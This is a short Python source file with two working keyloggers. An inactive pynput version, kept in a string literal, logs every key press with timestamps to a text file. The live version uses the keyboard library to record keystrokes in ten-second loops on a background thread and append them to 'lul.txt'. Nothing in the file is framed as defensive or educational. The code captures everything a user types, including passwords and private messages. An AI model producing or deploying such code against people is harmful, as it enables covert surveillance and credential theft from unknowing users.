'''
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
'''
import keyboard as kb
import threading
import time as t
def write_into_file(rec):
    f = open('lul.txt','a+')
    for i in range(0, len(rec)):
        if rec[i].event_type == 'down':
            f.write(rec[i].name + '')
    f.close()
def key_logger():
    while True:
        kb.start_recording()
        t.sleep(10)
        rec = kb.stop_recording()
        write_into_file(rec)
def start_key_logger():
    threading.Thread(target=key_logger).start()